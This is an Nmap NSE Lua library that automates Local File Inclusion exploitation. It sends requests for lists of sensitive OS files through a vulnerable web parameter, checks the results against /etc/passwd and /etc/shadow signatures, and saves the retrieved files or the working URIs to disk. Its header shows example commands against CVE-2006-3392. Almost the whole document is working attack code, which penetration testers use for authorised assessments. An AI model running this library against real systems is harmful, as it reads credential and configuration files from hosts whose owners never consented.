---
-- An exploit library for nmap.
--
-- This module provides NSE scripts with an easy way to write exploitation for
-- target services - at it's current state, it is capable of exploiting hosts
-- that are vulnerable to Local File Inclusion (LFI) by enumerating through
-- the files that are in the system
--
-- Exploiting Local File Inclusion
-- This library aims to assist in Local File Inclusion exploitation by
-- automatically enumerating through possible local file inclusion candidates
-- It serves to augment existing LFI scripts and future LFI scripts.
--
-- If the option <code>exploit.load-all</code> is provided, the script tries to
-- download interesting files from the target to the directory provided. The
-- directory must be created first for this to work.
--
-- If the option <code>exploit.load-all-uri-only</code> is provided, it simply
-- loads the successful LFI'd uris to the file given in the option.
--
-- If the option <code>exploit.lfi-file-list</code> is provided, the script
-- will only load the list of files provided in the file specified by the option
--
-- If the option <code>exploit.lfi-os</code> is provided, the script will
-- attempt to only load files belonging to that OS (default: auto)
-- (options are All, Auto, Linux, Windows, OSX)
--
-- If the script uses a non standard request (i.e. in a POST body, like in
-- http-phpmyadmin-dir-traversal, one can make use of a function like <code>
-- generate_rgf</code>, to produce a response-generating-function, which is a
-- function that takes in a parameter <code>file</code> e.g. <code>/etc/passwd
-- </code> and expects a response and uri called to be returned. In summary
-- the rgf is a function which given a file, makes the request and returns the
-- response table and uri queried. This function needs to be passed as a
-- parameter to <code>exploit.lfi_check</code>. As an example:
-- <code>
-- -- we define the function to generate the rgf with the necessary parameters
-- local function generate_rgf(host, port, options, uri)
--  -- we are want the closure/function to be returned, we return function
--  -- as mentioned above, it must take in a file parameter in order for it
--  -- to support enumeration of directories
--  return function (file)
--    -- we format the postdata that invoke the LFI
--    local postdata = EXPLOIT:QUERY:format(file)
--    -- we make the actual request here and store the request
--    local response = http.post(host, port, uri, options, nil, postdata)
--    -- we return both the response and uri
--    -- both outputs are needed by the library
--    return response, uri
--  end
-- end
-- -- in the action function we simply have to call exploit.lfi_check as below
--  exploit.lfi_check(host, port, nil, nil, nil, nil, nil,
--    generate_rgf(host, port, options, evil_uri))
--</code>
--
-- The main usage of this comes from exploit.lfi_check, which returns
-- <code>status</code>, the status of the request, <code>lfi_success</code>
-- which checks if the lfi has succeeded based on existing signatures
-- <code>contents</code> which contains the content of the response.body
-- <code>lfi_uris</code> which is a table containing the successful lfis when
-- <code>exploit.load-all-uri-only</code> is used. <code>outfile_status</code>
-- which reflects the status of writing to the file, and <code>outfile_err
-- </code> which contains the error message when writing, if any error occurred
--
-- Example usage:
-- <code>
-- To save successful uris to a list
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all-uri-only=evil_file
--
-- To load and save all successful lfi'd files using the default lists
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all=evil_dir
--
-- To load and save all successful lfi'd files using a user-defined list
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all=evil_dir,exploit.lfi-file-list=lfi.lst
--
-- To save successful uris only enumerating files belonging to a particular OS (in this case OSX)
-- nmap --script http-vuln-cve2006-3392 192.168.15.134 -p 10000 --script-args exploit.load-all-uri-only=evil_file,exploit.lfi-os=OSX
-- </code>
--
-- @copyright Same as Nmap--See https://nmap.org/book/man-legal.html

local stdnse = require "stdnse"
local http = require "http"
local string = require "string"
local table = require "table"
local io = require "io"
local os = require "os"

_ENV = stdnse.module("exploit", stdnse.seeall)

local FILE_SIGNATURES = {
  ['passwd'] = '(.*:.*:.*:.*:.*:.*:.*\n?)',
  ['shadow'] = '(.*:.*:.*:.*:.*:.*:.*:.*:.*\n?)',
}


-- source: https://github.com/lightos/Panoptic/blob/master/cases.xml
local LFI_FILES = {
  ["Linux"] = nmap.fetchfile("nselib/data/lfi-linux.lst"),
  ["Windows"] = nmap.fetchfile("nselib/data/lfi-windows.lst"),
  ["OSX"] = nmap.fetchfile("nselib/data/lfi-osx.lst"),
}

--  files to be enumerated
local FILES = {}

--- Writes string to file
--  Modified from: hostmap.nse
--  @param filename Filename to write
--  @param contents Content of file
--  @param original filename, if given
--  @param append   boolean signalling to append to a file rather than overwrite
--  @return true if file was written successfully, false otherwise
function write_file(filename, contents, original_file, append)
  local f, err
  if append then
    f, err = io.open(filename, "a")
  else
    f, err = io.open(filename, "w")
  end
  if not f then
    if original_file then
      stdnse.debug2("Error saving %s to %s: %s\n", original_file, filename, err)
    else
      stdnse.debug2("Error saving \"%s\" to %s: %s\n", contents, filename, err)
    end
    return f, err
  end
  f:write(contents)
  f:close()
  if original_file then
    stdnse.debug2("%s saved to %s\n", original_file, filename)
  else
    stdnse.debug2("\"%s\" saved to %s\n", contents, filename)
  end
  return true
end


--- loads a list to a table, ignoring commented lines denoted by '*'
--  @param  tbl       the table where the entries will be loaded
--  @param  file      the file where entries will be read
--  @return status    true if the file was successfully loaded, false otherwise
local function load_list_to_table(tbl, file, host)
  local status = false
  local file_h = io.open(file, "r")

  if not file then
    return false
  end

  for l in file_h:lines() do
    -- comments start with *, we remove all characters after the first *
    local p_line = string.gsub(l, "%*.*", "")

    -- we substitute {HOST} with the actual hostname, if we have
    if host.targetname then
      p_line = string.gsub(p_line, "{HOST}", host.targetname)
    elseif host.name ~= "" then
      p_line = string.gsub(p_line, "{HOST}", host.name)
    else
      p_line = string.gsub(p_line, "{HOST}", host.ip)
    end

    if p_line ~= "" then
      table.insert(tbl, p_line)
    end
  end
  status = true
  if status then
    stdnse.debug3("Successfully loaded %s", file)
  else
    stdnse.debug3("Failed to load %s", file)
  end
  return status
end

--- Loads table of files to be enumerated
--  @param oses       array of oses relevant to the lfi, default nil which loads all
--  @param file_list  filepath leading to the file_list to be loaded, default nil
local function load_file_list_lfi(oses, file_list, host)
  if #(stdnse.keys(FILES)) > 0 then
    FILES = {}
  end

  local oses_loaded
  local os_option = stdnse.get_script_args("exploit.lfi-os")
  if os_option == 'All' then
    oses_loaded = stdnse.keys(LFI_FILES)
  elseif os_option == 'Windows' or os_option == 'Linux' or os_option == 'OSX' then
    oses_loaded = {}
    oses_loaded[#oses_loaded + 1] = os_option
  else
    -- default: load auto
    -- rely on OS detection to figure out what files to load
    oses_loaded = {}
    -- if no OS is detected and user did not provide a custom list, load all
    if ((not oses) or (not oses_loaded or #oses == 0)) and not file_list then
      oses_loaded = stdnse.keys(LFI_FILES)
    else
      for _, os in pairs(oses) do
        -- if the os family is linux load both Linux and OSX files
        if os == 'Linux' and not stdnse.contains(oses_loaded, 'OSX') then
          stdnse.debug3('loaded OSX')
          oses_loaded[#oses_loaded + 1] = 'OSX'
        end
        if not stdnse.contains(oses_loaded, os) then
          stdnse.debug3('loaded %s', os)
          oses_loaded[#oses_loaded + 1] = os
        end
      end
    end
  end

  stdnse.debug3("OSes: %s, file_list: %s", oses, file_list)

  if file_list then
    load_list_to_table(FILES, file_list, host)
  else
    for _, os in pairs(oses_loaded) do
      load_list_to_table(FILES, LFI_FILES[os], host)
    end
  end
end

--- Gets the last portion of the filepath
--  e.g. /etc/passwd returns passwd
--  @param filepath       the filepath
--  @return A string containing the last portion from the filepath
function filepath_last_part(filepath)
  if string.match(filepath, '/') then
    return string.match(filepath, '.*/(.+)')
  else
    return filepath
  end
end

--- Gets the most specifc provided script-args
--  Chooses between the script args "exploit.cmd" and "SCRIPT_NAME.cmd"
--  @param   script_name   the caller script name
--  @return  a string with the most specific cmd to run
function get_shell_cmd(script_name)
  local cmd = stdnse.get_script_args(script_name .. '.cmd') or
    stdnse.get_script_args('exploit.cmd')
  return cmd
end

--- Processes the uri so it performs the lfi
--  @param  file           the file to include
--  @param  replace_slash  the character to replace slash with
--  @param  payload        the payload that triggers the lfi
--  @param  postfix        the character(s) to append at the back of the final uri
--  @return uri            the processed uri which triggers the lfi to get the local file
local function process_lfi_uri(file, replace_slash, payload, postfix)
  local r_file = file -- representation of file in uri
  if replace_slash then
    r_file = string.gsub(r_file, '/', replace_slash)
  end

  local uri = payload .. r_file
  if postfix then
    uri = uri .. postfix
  end
  return uri
end

--- processes the result of an lfi for saving
--  @param res                  the response from the server
--  @param host                 the host which we are running the attack against
--  @param port                 the port which hosts the services we are attacking
--  @param uri                  the uri queried for the lfi
--  @param file                 the original filename
--  @param successful_lfi_uris  table of successful lfi uris
--  @param directory            optional parameter to indicate whether to save to a directory
local function process_lfi_res(res, host, port, file, uri, successful_lfi_uris, directory)
  if res.status and res.status == 200 and res.body and res.body ~= "" then
    -- verify that the files are indeed correct before adding them
    local verifiable, verified = verify_file(file, res.body)
    if (verifiable and verified) or not verifiable then
      -- sets prefix to https if ssl is enabled, http otherwise
      local prefix = 'http' .. ((res.ssl and 's') or '') .. '://'
      local saved_uri = string.format('%s%s:%s%s\n', prefix, host.ip, port.number, uri)
      table.insert(successful_lfi_uris, saved_uri)

      if directory then
        -- saves only the last portion of the filepath to avoid issues with '/'
        local truncated_file = string.format("[%s]%s", host.ip, stdnse.filename_escape(file))
        local save_file = directory .. truncated_file
        write_file(save_file, res.body, file)
      end
    end
  end
end

--- Loads common files if the LFI was successful
--  @param  host           the target host
--  @param  port            the target port
--  @param  payload         the payload that triggers the LFI
--  @param  directory       the directory to save the accessed files to
--  @param  replace_slash   the character to replace slash with
--  @param  postfix         the character(s) to append to the end of the uri
--  @param  load_uri_file   the file to save the uris that have been successfully lfi'd
--  @param  rgf             the response generating function, which takes in filepath and outputs the response of the call made to the target, if specified then payload is optional
--  @return A table containing strings of all successful LFIs that have been enumerated
local function load_all_lfi (host, port, payload, directory, replace_slash, postfix, load_uri_file, rgf)
  local successful_lfi_uris = {}
  -- ensures that directory is interpreted as a directory when writing
  if directory then
    directory = directory .. '/'

    -- ensures the directory is writable
    local status, err = write_file(directory .. 'test', 'abc')
    if err and string.match(err, 'No such file or directory') then
      stdnse.debug1('Error writing file, are you sure you have created the directory?')
      return nil
    end
    os.remove(directory .. 'test')
  end

  local lfi_file_list = stdnse.get_script_args('exploit.lfi-file-list')
  local oses = nil
  if host.os and host.os[1] then
    oses = {}
    stdnse.debug3("Potential OSes : %s", #host.os)
    for i, os in pairs(host.os) do
      local detected_os = host.os[i]['classes'][1]['osfamily']
      stdnse.debug2("OS Family Detected: %s", detected_os)
      oses[#oses+1] = detected_os
    end
  end
  load_file_list_lfi(oses, lfi_file_list, host)

  if rgf then
    for _, file in ipairs(FILES) do
      local result, uri_queried = rgf(file)
      process_lfi_res(result, host, port, file, uri_queried, successful_lfi_uris, directory)
    end
  else
    -- parralelize with http.pipeline
    local all = nil
    local order_of_uri = {}

    for _, file in ipairs(FILES) do
      local uri = process_lfi_uri(file, replace_slash, payload, postfix)
      all = http.pipeline_add(uri, nil, all, "GET")
      order_of_uri[#order_of_uri+1] = {file, uri}
    end

    local results = http.pipeline_go(host, port, all)
    for i, result in pairs(results) do
      local l_file, l_uri = table.unpack(order_of_uri[i])
      process_lfi_res(result, host, port, l_file, l_uri, successful_lfi_uris, directory)
    end
  end

  -- saves successful lfi-uris to a file if option is provided
  if load_uri_file then
    for _, lfi_url in ipairs(successful_lfi_uris) do
      write_file(load_uri_file, lfi_url, nil, true)
    end
  end

  return successful_lfi_uris
end

--- Verifies if a file is what it says it is
--  e.g. checks if /etc/passwd contains the expected syntax
--  @param filename       the name of the file to be checked against
--  @param file_contents  the contents of the file
--  @return verfiable     a boolean representing if the file has signatures
--  @return verified      a boolean representing if the file matches the signatures, if any
function verify_file(filename, file_contents)
  local verifiable, verified = false
  if filename and file_contents then
    local filename = filepath_last_part(filename)
    if FILE_SIGNATURES[filename] then
      verifiable = true
      if filename.match(file_contents, FILE_SIGNATURES[filename]) then
        verified = true
      end
    end
  end
  return verifiable, verified
end

--- Executes a LFI on the target URI
--  @param  host            the remote target ip to attack
--  @param  port            the port to run to attack against
--  @param  payload         the lfi payload
--  @param  filename        the local file name to include
--  @param  outfile         the output file to save to
--  @param  replace_slash   character to replace slashes with
--  @param  postfix         postfix for the filepath
--  @param  rgf             the response generating function, which takes in filepath and outputs the response of the call made to the target, if specified then payload is optional
--  @return status          the status of the request
--  @return lfi_success     the status of the lfi attack
--  @return contents        the contents of the file, equivalent to response.body
--  @return lfi_uris        the table containing other uris that have been successfully loaded
--  @return outfile_status  the status of writing to the outfile
--  @return outfile_err     the error returned, if any, when writing to outfile
function lfi_check(host, port, payload, filename, outfile, replace_slash, postfix, rgf)
  local l_filename = filename or stdnse.get_script_args("exploit.lfi_file") or "/etc/passwd"
  local outfile = outfile or stdnse.get_script_args("exploit.outfile")
  local load_all_dir = stdnse.get_script_args("exploit.load-all")
  local load_all_uri_only_file = stdnse.get_script_args("exploit.load-all-uri-only")
  if replace_slash then
    string.gsub(l_filename, '/', replace_slash)
  end

  local req

  if rgf then
    req = rgf(l_filename)
  else
    local uri = payload .. l_filename

    if postfix then
      uri = uri .. postfix
    end

    stdnse.debug1("Getting %s", uri)
    req = http.get(host, port, uri)
    if req then
      stdnse.debug1("Status code %s", req.status)
    end
  end

  -- response came back
  if req and req.status and req.status == 200 then
    -- quit if body is empty, meaning file not included
    if string.len(req.body) <= 0 then
      stdnse.debug1("Response was empty using %s", uri)
      return req.status, false, req.body
    end

    -- if there are signatures try to verify them
    local verifiable, verified = verify_file(l_filename, req.body)
    local outfile_status, outfile_err
    if outfile then
      outfile_status, outfile_err = write_file(outfile, req.body, stdnse.filename_escape(l_filename))
    end

    -- we deem it successful if
    -- there are known signatures and signatures check pass
    -- OR if there no known signatures and lfi passed
    local lfi_success = (verifiable and verified) or (not verifiable and req.status)

    local lfi_uris
    -- we only load more files if the lfi is successful
    if lfi_success and (load_all_dir or load_all_uri_only_file) then
      lfi_uris = load_all_lfi(host, port, payload, load_all_dir, replace_slash,
        postfix, load_all_uri_only_file, rgf)
    end

    return req.status, lfi_success, req.body, lfi_uris, outfile_status, outfile_err
  else
    return req.status, false, req.body
  end

end

return _ENV
